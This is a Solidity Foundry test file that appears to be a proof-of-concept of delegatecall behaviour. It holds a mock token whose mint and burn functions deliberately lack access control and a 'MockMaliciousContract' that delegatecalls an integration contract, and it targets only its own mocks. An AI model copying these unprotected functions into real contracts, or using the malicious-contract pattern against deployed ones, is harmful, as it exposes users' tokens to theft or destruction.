pragma solidity 0.8.19;

import "forge-std/Test.sol";

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract ResonanceToken is ERC20 {
    address restrictedSender;

    constructor(address _restrictedSender) ERC20("ResonanceToken", "RES") {
        restrictedSender = _restrictedSender;
    }

    function mintOpen(address account, uint256 amount) external {
        _mint(account, amount);
    }

    function burn(address account, uint256 amount) external {
        _burn(account, amount);
    }

    function burnBySender(uint256 amount) external {
        _burn(msg.sender, amount);
    }

    function burnRestricted(address account, uint256 amount) external {
        require(msg.sender == restrictedSender, "Not authorized");
        _burn(account, amount);
    }
}

contract MockMaliciousContract {
    // storage slots need to match integration/target
    ResonanceToken resToken;
    mapping(address => uint256) public deposits;

    address integrationContract;
    bytes cubePayload;
    address owner;

    constructor(address _integrationContract, address _token) {
        owner = msg.sender;
        integrationContract = _integrationContract;
        resToken = ResonanceToken(_token);
    }

    function maliciousFunction() public {
        (bool success, bytes memory data) =
            integrationContract.delegatecall(abi.encodeWithSignature("protectedLockTenTokens()"));
        require(success, "Not successful");
    }

    function maliciousFunctionSender() public {
        (bool success, bytes memory data) =
            integrationContract.delegatecall(abi.encodeWithSignature("protectedLockTenTokensSender()"));
        require(success, "Not successful");
    }

    function maliciousFunctionRestricted() public {
        (bool success, bytes memory data) =
            integrationContract.delegatecall(abi.encodeWithSignature("protectedLockTenTokensRestricted()"));
        require(success, "Not successful");
    }
}

contract ResonanceIntegration {
    ResonanceToken resToken;
    mapping(address => uint256) public deposits;

    constructor() {}

    function setToken(address _tokenAddress) public {
        resToken = ResonanceToken(_tokenAddress);
    }

    // why bother phishing the user when you can call resToken.burn directly on the token contract?
    function protectedLockTenTokens() public {
        deposits[msg.sender] += 10;
        resToken.burn(msg.sender, 10);
        resToken.balanceOf(msg.sender);
    }

    function protectedLockTenTokensSender() public {
        deposits[msg.sender] += 10;
        resToken.burnBySender(10);
        resToken.balanceOf(msg.sender);
    }

    function protectedLockTenTokensRestricted() public {
        deposits[msg.sender] += 10;
        resToken.burnRestricted(msg.sender, 10);
        resToken.balanceOf(msg.sender);
    }
}

contract ResonanceTest is Test {
    ResonanceToken resToken;
    ResonanceIntegration resIntegration;
    MockMaliciousContract maliciousContract;
    address user;

    function setUp() public {
        user = makeAddr("user");

        resIntegration = new ResonanceIntegration();

        resToken = new ResonanceToken(address(resIntegration));
        resIntegration.setToken(address(resToken));
        maliciousContract = new MockMaliciousContract(address(resIntegration), address(resToken));
        resToken.mintOpen(user, 100);
        assertEq(resToken.balanceOf(user), 100);
    }

    function testRaw() public {
        // resToken.burn(user,10);
        vm.startPrank(user);
        resIntegration.protectedLockTenTokens();
    }

    function testResonancePoc() public {
        vm.startPrank(user);
        maliciousContract.maliciousFunction();
    }

    function testSenderResonancePoc() public {
        vm.startPrank(user);
        maliciousContract.maliciousFunctionSender();
    }

    function testRestrictedResonancePoc() public {
        vm.startPrank(user);
        maliciousContract.maliciousFunctionRestricted();
    }
}
